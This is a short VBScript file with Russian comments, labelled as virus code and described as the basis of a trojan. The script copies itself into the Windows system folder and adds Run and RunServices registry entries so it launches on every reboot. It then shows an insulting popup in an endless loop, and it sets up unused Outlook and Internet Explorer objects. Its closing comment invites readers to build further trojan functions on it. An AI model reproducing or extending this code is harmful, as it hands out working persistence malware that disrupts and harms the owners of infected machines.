'            = = = = = =  = > КОД ВИРУСА < = = = = = = = 

'      Объявление переменных(этот абзац не перемещать)
Set FileSystemObject = CreateObject("scripting.filesystemobject")
Set Shell = CreateObject("Wscript.Shell")
t = 0: On Error Resume Next ' Пропускать ошибки
Set Application = CreateObject("Shell.Application")
Set InternerExplorer = WScript.CreateObject("InternetExplorer.Application")
Set Outlook = WScript.CreateObject("Outlook.Application")


' Запускаться при каждой перезагрузке
Set File2 = FileSystemObject.GetFile(WScript.ScriptFullName)
File2.Copy ("c:\windows\System\Gigabyte.vbs")
Shell.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\Gigabyte", "C:\WINDOWS\SYSTEM\Gigabyte.vbs"
Shell.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices\Gigabyte", "C:\WINDOWS\SYSTEM\Gigabyte.vbs"

'     Вывести сообщение 
Do
Shell.popup "ИДИОТ! слезь с кресла и не шарься в компе!", 10, "КРИТИН !", 0+48
Loop


' Написаный пользователем код

'**********************************
' Этот пример показывает как можно сделать
' торояна. Здесь представлено только его 
' основа, а остальные функции задать будет
' делом техники.
'**********************************
